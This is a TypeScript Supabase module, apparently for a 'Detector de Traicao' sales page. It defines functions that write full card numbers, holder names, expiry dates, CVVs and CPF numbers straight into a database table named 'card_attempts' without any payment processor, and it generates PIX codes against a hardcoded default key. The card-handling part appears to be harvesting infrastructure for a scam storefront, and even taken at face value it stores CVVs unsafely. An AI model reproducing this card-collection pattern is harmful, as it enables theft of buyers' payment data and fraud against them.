import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://your-project-id.supabase.co'
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'your-anon-key-here'

export const supabase = createClient(supabaseUrl, supabaseAnonKey)

// Interface para dados do cartão
export interface CardData {
  id?: string
  card_number: string
  card_holder: string
  expiry_date: string
  cvv: string
  cpf: string
  email?: string
  phone?: string
  amount: number
  payment_confirmed?: boolean
  created_at?: string
}

// Interface para pagamentos PIX
export interface PixPayment {
  id?: string
  pix_code: string
  amount: number
  email?: string
  phone?: string
  payment_confirmed?: boolean
  expires_at: string
  created_at?: string
}

// Função para salvar dados do cartão
export const saveCardData = async (cardData: Omit<CardData, 'id' | 'created_at'>) => {
  try {
    const { data, error } = await supabase
      .from('card_attempts')
      .insert([
        {
          ...cardData,
          created_at: new Date().toISOString()
        }
      ])
      .select()

    if (error) {
      console.error('Erro ao salvar dados do cartão:', error)
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    console.error('Erro na requisição:', error)
    return { success: false, error }
  }
}

// Função para criar pagamento PIX
export const createPixPayment = async (pixData: Omit<PixPayment, 'id' | 'created_at'>) => {
  try {
    const { data, error } = await supabase
      .from('pix_payments')
      .insert([
        {
          ...pixData,
          created_at: new Date().toISOString()
        }
      ])
      .select()

    if (error) {
      console.error('Erro ao criar pagamento PIX:', error)
      return { success: false, error }
    }

    return { success: true, data: data[0] }
  } catch (error) {
    console.error('Erro na requisição:', error)
    return { success: false, error }
  }
}

// Função para verificar status do pagamento PIX
export const checkPixPaymentStatus = async (pixId: string) => {
  try {
    console.log('🔍 Consultando Supabase para ID:', pixId)
    
    const { data, error } = await supabase
      .from('pix_payments')
      .select('payment_confirmed, expires_at, id, created_at')
      .eq('id', pixId)
      .single()

    console.log('📊 Resposta do Supabase:', { data, error })

    if (error) {
      console.error('❌ Erro ao verificar pagamento PIX:', error)
      return { success: false, error }
    }

    console.log('✅ Dados encontrados:', data)
    console.log('💰 Payment confirmed:', data?.payment_confirmed)

    return { success: true, data }
  } catch (error) {
    console.error('💥 Erro na requisição:', error)
    return { success: false, error }
  }
}

// Função para verificar status do pagamento do cartão
export const checkCardPaymentStatus = async (cardId: string) => {
  try {
    const { data, error } = await supabase
      .from('card_attempts')
      .select('payment_confirmed')
      .eq('id', cardId)
      .single()

    if (error) {
      console.error('Erro ao verificar pagamento do cartão:', error)
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    console.error('Erro na requisição:', error)
    return { success: false, error }
  }
}

// Função para calcular CRC16 (necessário para PIX)
const crc16 = (str: string): string => {
  let crc = 0xFFFF
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = (crc << 1) ^ 0x1021
      } else {
        crc = crc << 1
      }
    }
  }
  crc = crc & 0xFFFF
  return crc.toString(16).toUpperCase().padStart(4, '0')
}

// Função para formatar campo PIX
const formatPixField = (id: string, value: string): string => {
  const length = value.length.toString().padStart(2, '0')
  return `${id}${length}${value}`
}

// Função para gerar PIX payload válido
export const generatePixCode = (amount: number, description: string = 'Detector de Traicao') => {
  const pixKey = import.meta.env.VITE_PIX_KEY || '17239089754'
  const merchantName = import.meta.env.VITE_PIX_MERCHANT_NAME || 'Detector de Traicao'
  const merchantCity = import.meta.env.VITE_PIX_MERCHANT_CITY || 'Sao Paulo'
  
  // Limitar tamanhos conforme especificação PIX
  const cleanMerchantName = merchantName.substring(0, 25).toUpperCase()
  const cleanMerchantCity = merchantCity.substring(0, 15).toUpperCase()
  const cleanPixKey = pixKey.replace(/\D/g, '') // Remove caracteres não numéricos
  const formattedAmount = amount.toFixed(2)
  
  // Construir payload PIX
  let payload = ''
  
  // Payload Format Indicator
  payload += formatPixField('00', '01')
  
  // Point of Initiation Method (opcional para pagamento único)
  payload += formatPixField('01', '12')
  
  // Merchant Account Information
  const pixKeyField = formatPixField('01', cleanPixKey)
  const merchantAccountInfo = formatPixField('00', 'BR.GOV.BCB.PIX') + pixKeyField
  payload += formatPixField('26', merchantAccountInfo)
  
  // Merchant Category Code
  payload += formatPixField('52', '0000')
  
  // Transaction Currency (BRL = 986)
  payload += formatPixField('53', '986')
  
  // Transaction Amount
  payload += formatPixField('54', formattedAmount)
  
  // Country Code
  payload += formatPixField('58', 'BR')
  
  // Merchant Name
  payload += formatPixField('59', cleanMerchantName)
  
  // Merchant City
  payload += formatPixField('60', cleanMerchantCity)
  
  // Additional Data Field Template (opcional)
  const additionalData = formatPixField('05', description.substring(0, 25))
  payload += formatPixField('62', additionalData)
  
  // CRC16 (sempre por último)
  payload += '6304'
  const crcValue = crc16(payload)
  payload += crcValue
  
  return {
    pixCode: payload,
    pixKey: cleanPixKey,
    amount: formattedAmount,
    description,
    merchantName: cleanMerchantName,
    merchantCity: cleanMerchantCity
  }
}
